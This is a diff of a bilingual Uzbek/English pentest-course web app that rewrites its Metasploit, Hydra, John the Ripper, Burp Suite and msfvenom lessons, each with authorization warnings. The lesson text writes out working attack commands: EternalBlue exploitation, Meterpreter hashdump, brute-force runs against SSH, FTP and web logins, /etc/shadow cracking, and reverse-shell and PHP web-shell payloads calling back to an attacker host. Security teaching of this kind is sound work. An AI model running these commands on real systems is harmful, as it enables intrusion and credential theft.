@@ -286,84 +286,29 @@ function LessonL01(){
     React.createElement(Quiz,{q:{uz:"Nmap -sV nima qiladi?",en:"What does Nmap -sV do?"},opts:[{uz:"Faqat ping",en:"Only pings"},{uz:"Ochiq portdagi xizmat va versiyani aniqlaydi",en:"Detects service and version on an open port"},{uz:"Faylni o'chiradi",en:"Deletes a file"},{uz:"VPN yoqadi",en:"Enables a VPN"}],correct:1,exp:{uz:"-sV ochiq port ortidagi xizmat va uning versiyasini aniqlaydi — ma'lum zaifliklarni izlash uchun asos.",en:"-sV detects the service and version behind an open port — a basis for finding known vulnerabilities."}}));
 }function LessonL21(){
   const lang=useLang();
-  const mods=[
-    {name:"exploit",uz:"Muayyan zaiflikdan foydalanib nishonga kirish uchun ishlatiladigan kod.",en:"Code that leverages a specific vulnerability to gain access to a target."},
-    {name:"payload",uz:"Ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod (masalan, Meterpreter).",en:"Code executed on the target after a successful exploit (e.g., Meterpreter)."},
-    {name:"auxiliary",uz:"Skanerlash, fuzzing, DoS — payloadsiz yordamchi modullar.",en:"Scanners, fuzzers, DoS — helper modules without a payload."},
-    {name:"post",uz:"Kirishdan keyingi ishlar: ma'lumot yig'ish, pivoting, imtiyozlarni oshirish.",en:"Post-exploitation: data gathering, pivoting, privilege escalation."},
-    {name:"encoder",uz:"Payloadni imzoga asoslangan aniqlashdan yashirish uchun kodlash.",en:"Encodes payloads to evade signature-based detection."},
-  ];
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Metasploit nima?","What is Metasploit?")),
-    React.createElement(P,null,t(lang,
-      "Metasploit Framework — ekspluatatsiya, payload yetkazish va post-ekspluatatsiya uchun modulli platforma. U dunyodagi eng keng ishlatiladigan pentest freymvorki bo'lib, Kali'da oldindan o'rnatilgan. Asosiy interfeysi — msfconsole. Modullar bir necha turga bo'linadi:",
-      "The Metasploit Framework is a modular platform for exploitation, payload delivery and post-exploitation. It is the most widely used pentest framework in the world and comes pre-installed on Kali. Its main interface is msfconsole. Modules are grouped into several types:"
-    )),
-    mods.map((m,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
-      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,color:"var(--c-attack)",background:"rgba(255,58,94,0.1)",border:"1px solid rgba(255,58,94,0.3)",borderRadius:6,padding:"2px 8px",flexShrink:0,minWidth:70,textAlign:"center"}},m.name),
-      React.createElement("div",{style:{flex:1,fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,m.uz,m.en))
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"msfconsole ish oqimi","msfconsole workflow")),
-    React.createElement(P,null,t(lang,
-      "Tipik ekspluatatsiya ketma-ketligi: ma'lumotlar bazasini ishga tushirish → modul qidirish → modulni tanlash → sozlamalarni to'ldirish → payload belgilash → ishga tushirish. Quyida EternalBlue (MS17-010) misolida real buyruqlar keltirilgan:",
-      "A typical exploitation sequence: start the database -> search for a module -> select it -> fill in options -> set a payload -> run. Below are the real commands using the EternalBlue (MS17-010) example:"
-    )),
-    React.createElement(Terminal,null,
-`# 1) PostgreSQL bazasini ishga tushirish
-sudo systemctl start postgresql
-sudo msfdb init
-
-# 2) Metasploit konsolini ochish
-msfconsole
-
-# 3) Modul qidirish
-msf6 > search eternalblue
-
-# 4) Modulni tanlash
-msf6 > use exploit/windows/smb/ms17_010_eternalblue
-
-# 5) Kerakli sozlamalarni ko'rish
-msf6 exploit(ms17_010) > show options
-
-# 6) Nishon va lokal manzilni belgilash
-msf6 exploit(ms17_010) > set RHOSTS 10.10.10.40
-msf6 exploit(ms17_010) > set LHOST 10.10.14.2
-
-# 7) Payload tanlash
-msf6 exploit(ms17_010) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
-
-# 8) Ekspluatatsiyani ishga tushirish
-msf6 exploit(ms17_010) > exploit`),
-    React.createElement(H2,{num:"§3"},t(lang,"Meterpreter asoslari","Meterpreter basics")),
-    React.createElement(P,null,t(lang,
-      "Ekspluatatsiya muvaffaqiyatli bo'lsa, siz Meterpreter sessiyasiga tushasiz — bu kuchli, xotirada ishlaydigan post-ekspluatatsiya shelli. Asosiy buyruqlar:",
-      "On a successful exploit you land in a Meterpreter session — a powerful, in-memory post-exploitation shell. Core commands:"
-    )),
-    React.createElement(Terminal,null,
-`meterpreter > sysinfo        # tizim ma'lumoti
-meterpreter > getuid         # joriy foydalanuvchi
-meterpreter > hashdump       # parol xeshlarini olish
-meterpreter > migrate 1234   # boshqa jarayonga o'tish
-meterpreter > shell          # to'liq tizim shelliga o'tish
-meterpreter > background     # sessiyani fon rejimiga o'tkazish`),
-    React.createElement(InfoBox,{color:"var(--c-attack)"},
-      React.createElement("strong",null,t(lang,"Axloqiy foydalanish: ","Ethical use: ")),
-      t(lang,
-        "Metasploit — kuchli hujum vositasi. Uni FAQAT siz egasi bo'lgan yoki yozma ruxsat (scope) olingan tizimlarda, o'quv laboratoriyalarida (masalan, Metasploitable, HackTheBox, TryHackMe) ishlatib o'rganing. Ruxsatsiz ekspluatatsiya jiddiy jinoiy javobgarlikka olib keladi.",
-        "Metasploit is a powerful offensive tool. Use it ONLY on systems you own or have written authorization (scope) for, and on training labs (e.g., Metasploitable, HackTheBox, TryHackMe). Unauthorized exploitation carries serious criminal liability."
-      )
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Metasploit'da ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod qanday modul deyiladi?",en:"In Metasploit, what module type is the code that runs on the target after a successful exploit?"},
-      opts:[{uz:"Ekspluatatsiya (exploit)",en:"Exploit"},{uz:"Payload",en:"Payload"},{uz:"Yordamchi (auxiliary)",en:"Auxiliary"},{uz:"Enkoder (encoder)",en:"Encoder"}],
-      correct:1,
-      exp:{uz:"Payload — ekspluatatsiya muvaffaqiyatli bo'lganda nishonda bajariladigan kod (masalan, Meterpreter reverse shell).",en:"The payload is the code executed on the target once the exploit succeeds (e.g., a Meterpreter reverse shell)."}
-    })
-  );
-}
-
-// ── Coming Soon placeholder ───────────────────────────────────
-function ComingSoon({lesson}){
+    React.createElement(P,null,t(lang,"Metasploit — dunyodagi eng mashhur ekspluatatsiya frameworki. U ma'lum zaifliklardan foydalanish uchun tayyor modullar, payloadlar va vositalarni birlashtiradi. Bu faqat ta'lim va ruxsat berilgan pentest uchun.","Metasploit is the world's most popular exploitation framework. It bundles ready modules, payloads and tools to leverage known vulnerabilities. For education and authorized pentesting only.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Ekspluatatsiya oqimi","The exploitation flow")),
+    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"msfconsole ish oqimi",en:"msfconsole workflow"},steps:[
+      {icon:"🔎",text:{uz:"search — mos modulni topish",en:"search — find a matching module"}},
+      {icon:"🎯",text:{uz:"use — modulni tanlash",en:"use — select the module"}},
+      {icon:"⚙",text:{uz:"set RHOSTS/LHOST — parametrlarni sozlash",en:"set RHOSTS/LHOST — configure options"}},
+      {icon:"💥",text:{uz:"run — ekspluatatsiyani ishga tushirish",en:"run — launch the exploit"}},
+      {icon:"🐚",text:{uz:"Muvaffaqiyatli bo'lsa → Meterpreter sessiyasi",en:"On success → a Meterpreter session"}},
+    ]}),
+    React.createElement(H2,{num:"§3"},t(lang,"Modul turlari","Module types")),
+    React.createElement(LayerStack,{layers:[
+      {n:"exploit",name:t(lang,"Ekspluatatsiya","Exploit"),color:"#ff3a5e",desc:{uz:"Zaiflikdan foydalanuvchi kod.",en:"Code that leverages a vulnerability."}},
+      {n:"payload",name:"Payload",color:"#a855f7",desc:{uz:"Muvaffaqiyatdan keyin bajariladigan yuk (reverse shell).",en:"The load run after success (reverse shell)."}},
+      {n:"aux",name:t(lang,"Yordamchi","Auxiliary"),color:"#4dabf7",desc:{uz:"Skaner, fuzzer, sniffer.",en:"Scanners, fuzzers, sniffers."}},
+      {n:"post",name:t(lang,"Post","Post"),color:"#69db7c",desc:{uz:"Kirishdan keyingi amallar.",en:"Post-access actions."}},
+    ]}),
+    React.createElement(Terminal,null,"msfconsole -q\nsearch ms17-010\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5\nrun"),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Metasploit ni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda ishlating.","Only use Metasploit in your own lab or on written-authorized targets.")),
+    React.createElement(Quiz,{q:{uz:"Ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod qanday modul deyiladi?",en:"What module runs on the target after a successful exploit?"},opts:[{uz:"Exploit",en:"Exploit"},{uz:"Payload",en:"Payload"},{uz:"Auxiliary",en:"Auxiliary"},{uz:"Encoder",en:"Encoder"}],correct:1,exp:{uz:"Payload — ekspluatatsiya muvaffaqiyatli bo'lganda nishonda bajariladigan kod (masalan Meterpreter).",en:"The payload is the code run on the target once the exploit succeeds (e.g. Meterpreter)."}}));
+}function ComingSoon({lesson}){
   const lang=useLang();
   return React.createElement("div",{style:{textAlign:"center",padding:"60px 20px",color:"var(--text-3)"}},
     React.createElement("div",{style:{fontSize:48,marginBottom:16}},"🐉"),
@@ -862,113 +807,57 @@ function LessonL03(){
 }function LessonL24(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Hydra nima?","What is Hydra?")),
-    React.createElement(P,null,t(lang,
-      "Hydra (THC-Hydra) — tezkor va parallel ishlaydigan onlayn parol buzish vositasi. U SSH, FTP, RDP, HTTP forma, SMB va o'nlab boshqa protokollarga qarshi lug'at (dictionary) hujumini amalga oshiradi. \"Onlayn\" degani — u to'g'ridan-to'g'ri jonli xizmatga urinadi.",
-      "Hydra (THC-Hydra) is a fast, parallelized online password-cracking tool. It performs dictionary attacks against SSH, FTP, RDP, HTTP forms, SMB and dozens of other protocols. 'Online' means it attacks a live service directly."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Sintaksis va misollar","Syntax and examples")),
-    React.createElement(Terminal,null,
-      "# Umumiy shakl:\n# hydra -l USER -P WORDLIST target service\n\n# SSH ga qarshi (bitta foydalanuvchi)\nhydra -l admin -P rockyou.txt ssh://10.0.0.5\n\n# FTP (foydalanuvchilar ro'yxati bilan)\nhydra -L users.txt -P pass.txt ftp://10.0.0.5\n\n# RDP\nhydra -l administrator -P pass.txt rdp://10.0.0.5"
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"HTTP forma hujumi","HTTP form attack")),
-    React.createElement(P,null,t(lang,
-      "Veb login formalari uchun http-post-form modulidan foydalaniladi. Muvaffaqiyatsizlikni bildiruvchi matnni (F=...) ko'rsatish kerak.",
-      "For web login forms, use the http-post-form module. You must specify the text that indicates failure (F=...)."
-    )),
-    React.createElement(Terminal,null,
-      "hydra -l admin -P rockyou.txt 10.0.0.5 http-post-form \\\n  \"/login.php:user=^USER^&pass=^PASS^:F=Invalid credentials\""
-    ),
-    React.createElement(InfoBox,{color:"var(--c-warn)"},
-      React.createElement("strong",null,"⚠ "),
-      t(lang,"Brute-force hujumlari faqat yozma ruxsat berilgan tizimlarda, masalan CTF yoki shartnomali pentestda o'tkazilishi kerak. Ruxsatsiz urinish jinoyat hisoblanadi va akkauntlarni bloklashi mumkin.",
-        "Brute-force attacks must only be run on systems with written authorization, such as CTFs or contracted pentests. Unauthorized attempts are a crime and can lock out accounts.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Hydra qanday turdagi parol hujumini amalga oshiradi?",en:"What type of password attack does Hydra perform?"},
-      opts:[{uz:"Oflayn hash buzish",en:"Offline hash cracking"},{uz:"Onlayn (jonli xizmatga) lug'at hujumi",en:"Online (against a live service) dictionary attack"},{uz:"Rainbow table",en:"Rainbow table lookup"},{uz:"Phishing",en:"Phishing"}],
-      correct:1,
-      exp:{uz:"Hydra onlayn hujum vositasi — u parollarni to'g'ridan-to'g'ri jonli xizmatga (SSH, FTP va h.k.) urinib sinaydi. Hashni oflayn buzish uchun John yoki Hashcat ishlatiladi.",en:"Hydra is an online attack tool — it tries passwords directly against a live service (SSH, FTP, etc.). For offline hash cracking you use John or Hashcat."}
-    })
-  );
-}
-
-// ── L25: John the Ripper ──────────────────────────────────────
-function LessonL25(){
+    React.createElement(P,null,t(lang,"Hydra — tezkor onlayn parol buzish vositasi. SSH, FTP, RDP, HTTP forma va o'nlab protokollarga qarshi lug'at hujumini amalga oshiradi. \"Onlayn\" — u to'g'ridan-to'g'ri jonli xizmatga urinadi.","Hydra is a fast online password-cracking tool. It runs dictionary attacks against SSH, FTP, RDP, HTTP forms and dozens of protocols. \"Online\" means it attacks a live service directly.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Brute-force oqimi","The brute-force flow")),
+    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Hydra hujumi",en:"Hydra attack"},steps:[
+      {icon:"📃",text:{uz:"Foydalanuvchi va parol ro'yxatlari tayyorlanadi",en:"Username and password lists are prepared"}},
+      {icon:"🔁",text:{uz:"Hydra har kombinatsiyani xizmatga urinib ko'radi",en:"Hydra tries each combination against the service"}},
+      {icon:"✅",text:{uz:"To'g'ri juftlik topilsa — ko'rsatiladi",en:"When a valid pair is found — it's shown"}},
+    ]}),
+    React.createElement(Terminal,null,"hydra -l admin -P rockyou.txt ssh://10.0.0.5\nhydra -L users.txt -P pass.txt ftp://10.0.0.5\nhydra -l admin -P rockyou.txt 10.0.0.5 http-post-form \\\n  \"/login:user=^USER^&pass=^PASS^:F=Invalid\""),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Brute-force ni faqat CTF yoki shartnomali pentestda o'tkazing. Ruxsatsiz urinish jinoyat va akkauntlarni bloklaydi.","Only run brute-force in a CTF or contracted pentest. Unauthorized attempts are a crime and lock accounts.")),
+    React.createElement(Quiz,{q:{uz:"Hydra qanday turdagi hujum vositasi?",en:"What kind of attack tool is Hydra?"},opts:[{uz:"Oflayn hash buzish",en:"Offline hash cracking"},{uz:"Onlayn (jonli xizmatga) lug'at hujumi",en:"Online (against a live service) dictionary attack"},{uz:"Rainbow table",en:"Rainbow table"},{uz:"Phishing",en:"Phishing"}],correct:1,exp:{uz:"Hydra onlayn — parollarni to'g'ridan-to'g'ri jonli xizmatga urinib sinaydi. Oflayn buzish uchun John/Hashcat.",en:"Hydra is online — it tries passwords against a live service. For offline cracking use John/Hashcat."}}));
+}function LessonL25(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"John the Ripper nima?","What is John the Ripper?")),
-    React.createElement(P,null,t(lang,
-      "John the Ripper (JtR) — mashhur oflayn parol hash buzish vositasi. \"Oflayn\" degani — u sizda mavjud hashlar bilan ishlaydi va nishon tizimga ulanmaydi. U yuzlab hash turlarini (MD5, SHA, NTLM, bcrypt va h.k.) qo'llab-quvvatlaydi.",
-      "John the Ripper (JtR) is a popular offline password-hash cracker. 'Offline' means it works on hashes you already have and never touches the target system. It supports hundreds of hash types (MD5, SHA, NTLM, bcrypt, etc.)."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Ish jarayoni","Workflow")),
-    React.createElement(Terminal,null,
-      "# 1. Linux hashlarini birlashtirish (root kerak)\nunshadow /etc/passwd /etc/shadow > hashes.txt\n\n# 2. Lug'at rejimida buzish\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# 3. Buzilgan parollarni ko'rish\njohn --show hashes.txt"
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"Rejimlar va formatlar","Modes and formats")),
-    React.createElement(Terminal,null,
-      "# Hash turini aniq ko'rsatish\njohn --format=raw-md5 hashes.txt\n\n# Incremental (brute-force) rejim\njohn --incremental hashes.txt\n\n# Qoidalar bilan (parollarni o'zgartirish)\njohn --wordlist=rockyou.txt --rules hashes.txt"
-    ),
-    React.createElement(InfoBox,{color:"var(--accent)"},
-      React.createElement("strong",null,t(lang,"John vs Hashcat: ","John vs Hashcat: ")),
-      t(lang,"John CPU'da moslashuvchan va formatlarni avtomatik aniqlaydi; Hashcat esa GPU tezligida ancha tez ishlaydi. Katta hajmdagi ishlar uchun Hashcat afzal.",
-        "John is flexible on the CPU and auto-detects formats; Hashcat runs much faster at GPU speed. For large jobs Hashcat is preferred.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"John the Ripper \"oflayn\" vosita deganda nima nazarda tutiladi?",en:"What does it mean that John the Ripper is an 'offline' tool?"},
-      opts:[{uz:"Internet talab qilmaydi",en:"It requires no internet"},{uz:"U nishon tizimga ulanmasdan, mavjud hashlarni buzadi",en:"It cracks existing hashes without connecting to the target"},{uz:"Faqat kechasi ishlaydi",en:"It only runs at night"},{uz:"Faqat Windows'da ishlaydi",en:"It only runs on Windows"}],
-      correct:1,
-      exp:{uz:"Oflayn buzish — bu qo'lga kiritilgan hashlarni mahalliy ravishda, nishon xizmatiga hech qanday so'rov yubormasdan sindirish.",en:"Offline cracking means breaking captured hashes locally, sending no requests to the target service."}
-    })
-  );
-}
-
-// ── L27: Burp Suite ───────────────────────────────────────────
-function LessonL27(){
+    React.createElement(P,null,t(lang,"John the Ripper (JtR) — mashhur oflayn parol hash buzuvchi. \"Oflayn\" — u sizda mavjud hashlar bilan ishlaydi va nishonga ulanmaydi. Yuzlab hash turini qo'llab-quvvatlaydi.","John the Ripper (JtR) is a popular offline password-hash cracker. \"Offline\" means it works on hashes you already have and never touches the target. It supports hundreds of hash types.")),
+    React.createElement(H2,{num:"§2"},t(lang,"Buzish oqimi","The cracking flow")),
+    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"John bilan buzish",en:"Cracking with John"},steps:[
+      {icon:"🔗",text:{uz:"unshadow bilan passwd+shadow ni birlashtirish",en:"Combine passwd+shadow with unshadow"}},
+      {icon:"📖",text:{uz:"Lug'at rejimida buzish (rockyou.txt)",en:"Crack in wordlist mode (rockyou.txt)"}},
+      {icon:"🧠",text:{uz:"Qoidalar bilan parollarni o'zgartirish (--rules)",en:"Mutate passwords with rules (--rules)"}},
+      {icon:"👁",text:{uz:"--show bilan buzilgan parollarni ko'rish",en:"View cracked passwords with --show"}},
+    ]}),
+    React.createElement(Terminal,null,"unshadow /etc/passwd /etc/shadow > hashes.txt\njohn --wordlist=rockyou.txt hashes.txt\njohn --show hashes.txt"),
+    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"John CPU'da moslashuvchan va formatlarni avtomatik aniqlaydi; Hashcat esa GPU tezligida ancha tez.","John is flexible on the CPU and auto-detects formats; Hashcat runs much faster at GPU speed.")),
+    React.createElement(Quiz,{q:{uz:"John \"oflayn\" vosita deganda nima nazarda tutiladi?",en:"What does it mean that John is an \"offline\" tool?"},opts:[{uz:"Internet talab qilmaydi",en:"It needs no internet"},{uz:"Nishonga ulanmasdan mavjud hashlarni buzadi",en:"It cracks existing hashes without touching the target"},{uz:"Faqat kechasi ishlaydi",en:"It only runs at night"},{uz:"Faqat Windows'da",en:"Windows only"}],correct:1,exp:{uz:"Oflayn buzish — qo'lga kiritilgan hashlarni mahalliy ravishda, nishonga so'rov yubormasdan sindirish.",en:"Offline cracking breaks captured hashes locally, sending no requests to the target."}}));
+}function LessonL27(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"Burp Suite nima?","What is Burp Suite?")),
-    React.createElement(P,null,t(lang,
-      "Burp Suite — veb-ilovalarni test qilishning sanoat standarti. U brauzer va server o'rtasida proksi sifatida o'tirib, HTTP so'rovlarni ushlash, o'zgartirish va qayta yuborish imkonini beradi. Kali'da Community versiyasi oldindan o'rnatilgan.",
-      "Burp Suite is the industry standard for testing web applications. It sits as a proxy between the browser and server, letting you intercept, modify and replay HTTP requests. The Community edition comes pre-installed on Kali."
-    )),
+    React.createElement(P,null,t(lang,"Burp Suite — veb-ilovalarni test qilishning sanoat standarti. U brauzer va server o'rtasida proksi bo'lib, HTTP so'rovlarni ushlash, o'zgartirish va qayta yuborish imkonini beradi. Kali'da oldindan o'rnatilgan.","Burp Suite is the industry standard for testing web applications. It sits as a proxy between browser and server, letting you intercept, modify and replay HTTP requests. Pre-installed on Kali.")),
     React.createElement(H2,{num:"§2"},t(lang,"Asosiy komponentlar","Core components")),
-    React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(200px,1fr))",gap:10,margin:"12px 0 18px"}},
-      [["Proxy",t(lang,"So'rovlarni ushlab o'zgartirish","Intercept & modify requests")],
-       ["Repeater",t(lang,"So'rovni qo'lda qayta yuborish","Manually resend a request")],
-       ["Intruder",t(lang,"Avtomatlashtirilgan fuzzing/brute","Automated fuzzing / brute force")],
-       ["Decoder",t(lang,"Kodlash/dekodlash (base64, URL)","Encode/decode (base64, URL)")]].map((x,i)=>
-        React.createElement("div",{key:i,style:{background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,padding:"12px 14px"}},
-          React.createElement("div",{style:{fontWeight:700,fontSize:13,color:"var(--accent)",marginBottom:4}},x[0]),
-          React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",lineHeight:1.5}},x[1])))
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"Proksi sozlash","Setting up the proxy")),
-    React.createElement(Terminal,null,
-      "# 1. Burp'da: Proxy > Intercept > Intercept is ON\n# 2. Brauzer proksi: 127.0.0.1:8080\n# 3. Burp CA sertifikatini o'rnatish:\n#    http://burp > Download CA Certificate\n#    Brauzer > Certificates > Import\n\n# FoxyProxy (brauzer kengaytmasi) almashtirishni osonlashtiradi"
-    ),
-    React.createElement(H2,{num:"§4"},t(lang,"Repeater bilan test","Testing with Repeater")),
-    React.createElement(P,null,t(lang,
-      "So'rovni ushlaganingizdan so'ng, unga o'ng tugma bosib \"Send to Repeater\" ni tanlang (yoki Ctrl+R). Repeater'da so'rovni istalgancha o'zgartirib qayta yuborishingiz va javobni tahlil qilishingiz mumkin — SQLi, XSS va boshqa zaifliklarni sinash uchun ideal.",
-      "After intercepting a request, right-click it and choose 'Send to Repeater' (or Ctrl+R). In Repeater you can modify and resend the request as many times as you like and analyze the response — ideal for testing SQLi, XSS and other vulnerabilities."
-    )),
-    React.createElement(InfoBox,{color:"var(--c-warn)"},
-      React.createElement("strong",null,"⚠ "),
-      t(lang,"Burp Suite'ni faqat sizga tegishli yoki test qilishga ruxsat berilgan veb-ilovalarda ishlating. PortSwigger'ning Web Security Academy'sida bepul amaliy laboratoriyalar mavjud.",
-        "Only use Burp Suite on web apps you own or are authorized to test. PortSwigger's Web Security Academy offers free hands-on labs.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"Burp Suite'ning qaysi qismi bitta so'rovni qo'lda o'zgartirib qayta-qayta yuborish uchun mo'ljallangan?",en:"Which part of Burp Suite is meant for manually modifying and resending a single request repeatedly?"},
-      opts:[{uz:"Proxy",en:"Proxy"},{uz:"Repeater",en:"Repeater"},{uz:"Decoder",en:"Decoder"},{uz:"Comparer",en:"Comparer"}],
-      correct:1,
-      exp:{uz:"Repeater bitta so'rovni qo'lda o'zgartirib, qayta yuborish va javoblarni solishtirish uchun ishlatiladi.",en:"Repeater is used to manually tweak a single request, resend it and compare the responses."}
-    })
-  );
-}
-
-
-// ── L02: Installing Kali ──────────────────────────────────────
-function LessonL02(){
+    React.createElement(LayerStack,{layers:[
+      {n:"Proxy",name:t(lang,"Ushlash","Intercept"),color:"#a855f7",desc:{uz:"So'rovlarni ushlab, o'zgartirish.",en:"Intercept and modify requests."}},
+      {n:"Repeater",name:t(lang,"Qayta yuborish","Replay"),color:"#4dabf7",desc:{uz:"Bitta so'rovni qo'lda o'zgartirib qayta yuborish.",en:"Manually tweak and resend one request."}},
+      {n:"Intruder",name:t(lang,"Fuzzing/brute","Fuzzing/brute"),color:"#ff3a5e",desc:{uz:"Avtomatik payload hujumlari.",en:"Automated payload attacks."}},
+      {n:"Decoder",name:t(lang,"Kodlash","Encode"),color:"#69db7c",desc:{uz:"base64, URL kodlash/dekodlash.",en:"base64, URL encode/decode."}},
+    ]}),
+    React.createElement(H2,{num:"§3"},t(lang,"Proksi bilan test oqimi","Testing with the proxy")),
+    React.createElement(FlowSteps,{color:"#a855f7",title:{uz:"Burp bilan so'rovni test qilish",en:"Testing a request with Burp"},steps:[
+      {icon:"🔌",text:{uz:"Brauzer proksisini 127.0.0.1:8080 ga sozlash",en:"Set the browser proxy to 127.0.0.1:8080"}},
+      {icon:"✋",text:{uz:"So'rovni ushlash (Intercept ON)",en:"Intercept a request (Intercept ON)"}},
+      {icon:"➡",text:{uz:"Repeater'ga yuborish (Ctrl+R)",en:"Send to Repeater (Ctrl+R)"}},
+      {icon:"🧪",text:{uz:"Payloadlarni o'zgartirib javobni tahlil qilish",en:"Modify payloads and analyze the response"}},
+    ]}),
+    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Burp ni faqat sizga tegishli yoki ruxsat berilgan veb-ilovalarda ishlating. Web Security Academy'da bepul laboratoriyalar bor.","Only use Burp on web apps you own or are authorized to test. Free labs at Web Security Academy.")),
+    React.createElement(Quiz,{q:{uz:"Burp'ning qaysi qismi bitta so'rovni qo'lda o'zgartirib qayta yuborishga mo'ljallangan?",en:"Which Burp part is for manually tweaking and resending one request?"},opts:[{uz:"Proxy",en:"Proxy"},{uz:"Repeater",en:"Repeater"},{uz:"Decoder",en:"Decoder"},{uz:"Comparer",en:"Comparer"}],correct:1,exp:{uz:"Repeater bitta so'rovni qo'lda o'zgartirib, qayta yuborish va javoblarni solishtirish uchun ishlatiladi.",en:"Repeater is used to manually tweak a single request, resend it and compare responses."}}));
+}function LessonL02(){
   const lang=useLang();
   return React.createElement("section",null,
     React.createElement(NetAnimStyle),
@@ -1185,214 +1074,101 @@ function LessonL02(){
 }function LessonL22(){
   const lang=useLang();
   return React.createElement("section",null,
+    React.createElement(NetAnimStyle),
     React.createElement(H2,{num:"§1"},t(lang,"msfvenom nima?","What is msfvenom?")),
-    React.createElement(P,null,t(lang,
-      "msfvenom — Metasploit tarkibidagi payload (yuk) generatori. U turli formatlarda (.exe, .elf, .apk, .php) bajariladigan zararli yuklarni yaratadi. Bu yuklar nishonda ishga tushganda hujumchiga teskari ulanish (reverse shell) beradi. Bu vosita faqat ta'lim va ruxsat berilgan pentest uchun.",
-      "msfvenom is the payload generator inside Metasploit. It creates executable payloads in various formats (.exe, .elf, .apk, .php). When run on a target these payloads give the attacker a reverse connection (reverse shell). This tool is only for education and authorized pentesting."
-    )),
-    React.createElement(H2,{num:"§2"},t(lang,"Payload yaratish","Generating a payload")),
-    React.createElement(Terminal,null,
-      "# Umumiy shakl: -p payload LHOST=... LPORT=... -f format\n\n# Windows reverse shell (.exe)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f exe -o shell.exe\n\n# Linux (.elf)\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=10.0.0.10 LPORT=4444 -f elf -o shell.elf\n\n# PHP veb-shell\nmsfvenom -p php/reverse_php LHOST=10.0.0.10 LPORT=4444 -f raw -o shell.php"
-    ),
-    React.createElement(H2,{num:"§3"},t(lang,"Ulanishni qabul qilish","Catching the connection")),
-    React.createElement(P,null,t(lang,
-      "Yuk nishonda ishga tushganda, u sizga qaytib ulanadi. Bu ulanishni qabul qilish uchun Metasploit'da tinglovchi (listener) sozlanadi:",
-      "When the payload runs on the target, it connects back to you. To catch this connection you set up a listener (handler) in Metasploit:"
-    )),
-    React.createElement(Terminal,null,
-      "msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.10\nset LPORT 4444\nrun"
-    ),
-    React.createElement(InfoBox,{color:"var(--c-warn)"},
-      React.createElement("strong",null,"⚠ "),
-      t(lang,"LHOST — sizning (hujumchi) IP manzilingiz, LPORT — siz tinglayotgan port. Bunday yuklarni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda sinang.",
-        "LHOST is your (the attacker's) IP, LPORT is the port you listen on. Only test such payloads in your own lab or on targets with written authorization.")
-    ),
-    React.createElement(Quiz,{
-      q:{uz:"msfvenom buyrug'ida LHOST nimani bildiradi?",en:"In an msfvenom command, what does LHOST specify?"},
-      opts:[{uz:"Nishonning IP manzili",en:"The target's IP address"},{uz:"Hujumchining (tinglovchining) IP manzili",en:"The attacker's (listener's) IP address"},{uz:"Lokal fayl nomi",en:"A local file name"},{uz:"Payload turi",en:"The payload type"}],
-      correct:1,
-      exp:{uz:"LHOST — teskari ulanish qaytadigan manzil, ya'ni hujumchining o'z IP'si. Nishon yuk ishga tushganda shu manzilga ulanadi.",en:"LHOST is the address the reverse connection returns to — the attacker's own IP. The target connects to it when the payload runs."}
-    })
-  );
-}
-
-// ── L23: searchsploit & Exploit-DB ────────────────────────────
-function LessonL23(){
+    React.createElement(P,null,t(lang,"msfvenom — Metasploit tarkibidagi payload generatori. Turli formatlarda (.exe, .elf, .apk) bajariladigan yuklarni yaratadi. Nishonda ishga tushganda hujumchiga teskari ulanish (reverse shell) beradi. Faqat ta'lim uchun.","msfvenom is the payload generator inside Metasploit. It creates executable payloads in various formats (.exe, .elf, .apk). When run on a target it gives the attacker a reverse shell. For education only.")),
